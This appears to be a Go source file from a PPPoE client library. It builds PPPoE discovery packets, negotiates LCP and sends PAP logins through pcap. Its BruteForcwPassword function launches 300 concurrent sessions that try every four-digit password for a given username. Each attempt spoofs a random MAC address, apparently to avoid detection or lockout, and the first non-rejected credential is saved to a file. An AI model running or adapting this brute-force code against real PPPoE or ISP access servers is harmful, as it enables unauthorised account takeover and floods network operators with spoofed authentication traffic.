package packets

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/dalaomai/pppoe-go/utils"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/sirupsen/logrus"
)

var logger *logrus.Logger = utils.GetPAPLogger()

type TLVType uint16

func CreateTLVBytes(typeInt TLVType, valueBytes []byte) []byte {
	typeUint := uint16(typeInt)

	typeBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(typeBytes, typeUint)

	lengBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengBytes, uint16(len(valueBytes)))

	return bytes.Join([][]byte{typeBytes, lengBytes, valueBytes}, []byte{})

}

func PAPLoginSession(device string, mac net.HardwareAddr, user string, pwd string, result chan PAP) {
	var (
		snapshot_len int32         = 1024
		promiscuous  bool          = true
		timeout      time.Duration = 5 * time.Second
	)
	handle, err := pcap.OpenLive(device, snapshot_len, promiscuous, timeout)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	sessionIdBytes := make([]byte, 2)
	_result := make(chan PAP)
	go func() {
		for packet := range packetSource.Packets() {
			handlePacketForPAPLogin(mac, user, pwd, sessionIdBytes, handle, packet, _result)
		}
	}()
	SendPADI(handle, mac, rand.Uint32())

	pap := <-_result
	result <- pap
}

func handlePacketForPAPLogin(mac net.HardwareAddr, user string, pwd string, sessionIdBytes []byte, handle *pcap.Handle, packet gopacket.Packet, result chan PAP) {

	sessionID := binary.BigEndian.Uint16(sessionIdBytes)
	ethernetLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethernetLayer == nil {
		logger.Warningf("not a ethernet packet:%v", packet)
		return
	}
	ethernetPacket, _ := ethernetLayer.(*layers.Ethernet)
	srcMAC := ethernetPacket.SrcMAC
	dstMAC := ethernetPacket.DstMAC
	if dstMAC.String() != mac.String() {
		return
	}
	ethernetType := ethernetPacket.EthernetType
	logger.Infof("%v -> %v  %v\n", srcMAC, dstMAC, ethernetType)

	switch ethernetType {
	case layers.EthernetTypePPPoEDiscovery:
		packet, err := DecodePPPoePacket(packet)
		if err != nil {
			logger.Error(err)
			return
		}
		switch packet.Packet.Code {
		case layers.PPPoECodePADO:
			err = SendPADR(handle, mac, srcMAC, *packet)
			if err != nil {
				logger.Error(err)
				return
			}
		case layers.PPPoECodePADS:
			binary.BigEndian.PutUint16(sessionIdBytes, packet.Packet.SessionId)
			logger.Infof("Get the Session:% v", sessionIdBytes)
		default:
			logger.Warn(packet)
		}
	case layers.EthernetTypePPPoESession:
		pppLayer := packet.Layer(layers.LayerTypePPP)
		pppPacket := pppLayer.(*layers.PPP)
		switch pppPacket.PPPType {
		case PPPTypeLCP:
			lcp, err := PareseLCP(pppPacket.Payload)
			if err != nil {
				logger.Error(err)
				return
			}
			switch lcp.Code {
			case LCPCodeConfigRequest:
				magicNumber := make([]byte, 4)
				// binary.BigEndian.PutUint32(magicNumber, rand.Uint32())
				ackLcp := LCP{
					Code:       LCPCodeConfigAck,
					Identifier: lcp.Identifier,
					TLVMap: map[LCPTLVType][]byte{
						MagicNumberType: lcp.TLVMap[MagicNumberType],
					},
				}
				ackLcp.Send(handle, mac, srcMAC, sessionID)

				binary.BigEndian.PutUint32(magicNumber, rand.Uint32())
				rqLCP := lcp
				// rqLCP.TLVMap[MagicNumberType] = magicNumber
				rqLCP.TLVMap = map[LCPTLVType][]byte{
					MagicNumberType: magicNumber,
				}
				rqLCP.Data = nil
				rqLCP.Identifier += 1
				rqLCP.Send(handle, mac, srcMAC, sessionID)
			case LCPCodeConfigAck:
				rqPAP := PAP{
					Code:     PAPCodeRequest,
					Username: user,
					Password: pwd,
				}
				rqPAP.Send(handle, mac, srcMAC, sessionID)
			}

			logger.Info(lcp)
		case PPPTypePAP:
			pap, err := ParesePAP(pppPacket.Payload)
			pap.Username = user
			pap.Password = pwd
			if err != nil {
				logger.Error(err)
				return
			}
			logger.Info(pap)
			result <- *pap
			return
		default:
			logger.Debug(pppPacket)
		}
	default:
	}
}

type PAPLoginSessionArg struct {
	device string
	mac    net.HardwareAddr
	user   string
	pwd    string
}

func BruteForcwPassword(device string, user string) {
	// TODO 搞一个中断信号

	result := make(chan PAP)
	args := make(chan PAPLoginSessionArg, 1000)

	for i := 0; i < 300; i++ {
		go func() {
			for arg := range args {
				PAPLoginSession(arg.device, arg.mac, arg.user, arg.pwd, result)
			}
		}()
	}

	go func() {
		for i := 10000; i > 999; i-- {
			args <- PAPLoginSessionArg{
				device: device,
				mac:    getRandomAddr(),
				user:   user,
				pwd:    fmt.Sprint(i),
			}
		}
	}()

	resultF, err := os.OpenFile(".temp/result.txt", os.O_CREATE|os.O_APPEND|os.O_RDWR, os.ModeAppend)
	if err != nil {
		logger.Fatal(err)
	}
	defer resultF.Close()

	for pap := range result {
		logger.Infof("%v %v %v", pap.Username, pap.Password, pap.Message)
		if pap.Message != "user passwd error" || pap.Message == "not user" {
			resultF.WriteString(fmt.Sprintf("%v %v %v\n", pap.Username, pap.Password, pap.Message))
			os.Exit(0)
		}
	}
}

func getRandomAddr() net.HardwareAddr {
	return net.HardwareAddr{0x80, byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32()), byte(rand.Uint32())}
}
